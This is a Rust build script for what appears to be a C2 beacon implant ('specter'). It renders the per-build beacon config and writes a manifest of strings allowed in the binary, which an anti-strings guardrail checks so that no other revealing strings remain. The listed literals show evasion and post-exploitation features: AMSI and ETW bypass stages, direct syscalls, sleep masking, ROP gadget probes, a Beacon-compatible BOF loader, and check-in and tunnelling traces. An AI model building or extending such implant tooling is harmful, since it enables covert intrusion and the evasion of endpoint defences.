fn main() {
    // Path-plumbing so the same module is shared by the build script and by
    // the host unit tests (crates/core/src/config.rs includes it under
    // #[cfg(test)]).
    #[path = "build/render.rs"]
    mod render;

    // Re-run when the config or the default profile changes.
    println!("cargo:rerun-if-env-changed=SPT_CONFIG");
    println!("cargo:rerun-if-env-changed=SPT_MANIFEST_OUT");
    println!("cargo:rerun-if-changed=build/render.rs");
    println!("cargo:rerun-if-changed=../../profiles/default.json");
    // The Makefile touches this stamp on every build so the strings manifest
    // is always regenerated even when cargo would otherwise cache the
    // build script (e.g. build/ was wiped but target/ was not).
    println!("cargo:rerun-if-changed=../../build/manifest.stamp");

    // Interface contract with agent_specter (unchanged from the C build in
    // function, changed in format by decision 2026-10-22): the Go plugin
    // writes the per-build config JSON before invoking cargo, exactly as it
    // previously wrote src_beacon/include/Config.h before invoking gcc.
    let json = match std::env::var("SPT_CONFIG") {
        Ok(path) => std::fs::read_to_string(&path)
            .unwrap_or_else(|e| panic!("SPT_CONFIG={path}: cannot read the config file: {e}")),
        Err(_) => render::default_config_json(),
    };

    let gen = render::generate(&json).unwrap_or_else(|e| panic!("invalid beacon config: {e}"));

    let out_dir = std::env::var("OUT_DIR").unwrap();
    std::fs::write(
        std::path::Path::new(&out_dir).join("config_gen.rs"),
        gen.rust_source,
    )
    .expect("cannot write config_gen.rs");

    // Strings the blob may legitimately contain (config data). Everything
    // else found by the anti-strings guardrail fails the build. The Makefile
    // routes this to build/config_strings.json via SPT_MANIFEST_OUT.
    let manifest_path = match std::env::var("SPT_MANIFEST_OUT") {
        Ok(p) => std::path::PathBuf::from(p),
        Err(_) => std::path::Path::new(&out_dir).join("config_strings.json"),
    };
    // Beacon runtime literals (not config): strings the beacon legitimately
    // needs at runtime, beyond the malleable profile. Adding one is a
    // conscious act — the anti-strings guardrail fails the build otherwise.
    let mut manifest = gen.strings_manifest;
    manifest.push(".text".to_string()); // find_section's section name probe
                                        // base64 alphabet of the beat header (core::transport)
    manifest.push("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".to_string());
    // runtime module-name literals (amsi resolution, deferred loader hook,
    // WinHTTP/IP/domain on-demand loads)
    manifest.push("amsi.dll".to_string());
    manifest.push("ntdll.dll".to_string());
    manifest.push("winhttp.dll".to_string());
    manifest.push("iphlpapi.dll".to_string());
    manifest.push("advapi32.dll".to_string());
    manifest.push("user32.dll".to_string());
    manifest.push("ws2_32.dll".to_string());
    manifest.push("gdi32.dll".to_string());
    // Debug-channel literals (config::DEBUG builds only; a false build
    // const-folds every site away, and absence is fine for the guard).
    manifest.push("specter.log".to_string());
    manifest.push("specter-rs: bootstrap ok".to_string());
    // Bootstrap stage trace (iteration 15): names the failing stage when a
    // real-Windows bootstrap dies before the instance exists.
    manifest.push("bs: log open".to_string());
    manifest.push("bs: modules ok".to_string());
    manifest.push("bs: exit ok".to_string());
    manifest.push("bs: syscalls ok".to_string());
    manifest.push("bs: clock ok".to_string());
    manifest.push("bs: etw ok".to_string());
    manifest.push("bs: gadget none".to_string());
    manifest.push("bs: gadget ff23".to_string());
    manifest.push("bs: gadget addrsp".to_string());
    manifest.push("tn: start ok".to_string());
    manifest.push("tn: recv".to_string());
    manifest.push("tn: write".to_string());
    manifest.push("tn: sel".to_string());
    manifest.push("tn: tick".to_string());
    manifest.push("tn: closetask".to_string());
    manifest.push("tn: tunnels".to_string());
    manifest.push("tn: noexport".to_string());
    manifest.push("tn: close".to_string());
    manifest.push("bs: sleepmask ok".to_string());
    manifest.push("bs: amsi ok".to_string());
    manifest.push("bs: heap ok".to_string());
    manifest.push("bs: winhttp ok".to_string());
    manifest.push("bs: sysinfo ok".to_string());
    manifest.push("si: base ok".to_string());
    manifest.push("si: tz ok".to_string());
    manifest.push("si: user ok".to_string());
    manifest.push("si: adapters ok".to_string());
    manifest.push("si: join ok".to_string());
    manifest.push("si: elev ok".to_string());
    manifest.push("si: os ok".to_string());
    manifest.push("sm: bounds".to_string());
    manifest.push("sm: ssn".to_string());
    manifest.push("sm: probe".to_string());
    manifest.push("sm: probe1".to_string());
    manifest.push("sm: probe2".to_string());
    manifest.push("sm: enter".to_string());
    manifest.push("sm: flips ok".to_string());
    manifest.push("sm: flip fail".to_string());
    manifest.push("veh:exc".to_string());
    manifest.push("jt: drain".to_string());
    manifest.push("jt: peeked ".to_string());
    manifest.push("jt: exit?".to_string());
    manifest.push("jt: avail".to_string());
    manifest.push("jt: read".to_string());
    manifest.push("jt: push".to_string());
    manifest.push("veh: on".to_string());
    manifest.push("bs: instance ok".to_string());
    manifest.push("bs: FAIL modules".to_string());
    manifest.push("bs: FAIL exit".to_string());
    manifest.push("bs: FAIL syscalls".to_string());
    manifest.push("bs: FAIL clock".to_string());
    manifest.push("check-in: begin".to_string());
    manifest.push("check-in: ok".to_string());
    manifest.push("ci: fail beat".to_string());
    manifest.push("ci: fail beat header".to_string());
    manifest.push("ci: fail headers".to_string());
    manifest.push("ci: fail results".to_string());
    manifest.push("ci: fail frame".to_string());
    manifest.push("ci: fail post".to_string());
    manifest.push("ci: posted".to_string());
    manifest.push("ci: fail range".to_string());
    manifest.push("ci: fail pack".to_string());
    manifest.push("bof: exec".to_string());
    manifest.push("bof: done".to_string());
    manifest.push("bof: error".to_string());
    // BOF loader literals: Beacon API names (hash dispatch), the import
    // naming convention of runner.c, the .pdata SEH registration probe,
    // and the append-seek of the debug log.
    manifest.push("BeaconOutput".to_string());
    manifest.push("BeaconPrintf".to_string());
    manifest.push("BeaconDataParse".to_string());
    manifest.push("BeaconDataInt".to_string());
    manifest.push("BeaconDataShort".to_string());
    manifest.push("BeaconDataLength".to_string());
    manifest.push("BeaconDataExtract".to_string());
    manifest.push("BeaconDataPtr".to_string());
    manifest.push("__imp_".to_string());
    manifest.push("BEACON".to_string());
    manifest.push(".pdata".to_string());
    manifest.push("SetFilePointer".to_string());
    manifest.sort();
    manifest.dedup();
    let manifest = serde_json::to_string(&manifest).expect("manifest serialize");
    if let Some(parent) = manifest_path.parent() {
        std::fs::create_dir_all(parent).expect("cannot create the manifest directory");
    }
    std::fs::write(&manifest_path, manifest).expect("cannot write the strings manifest");
}
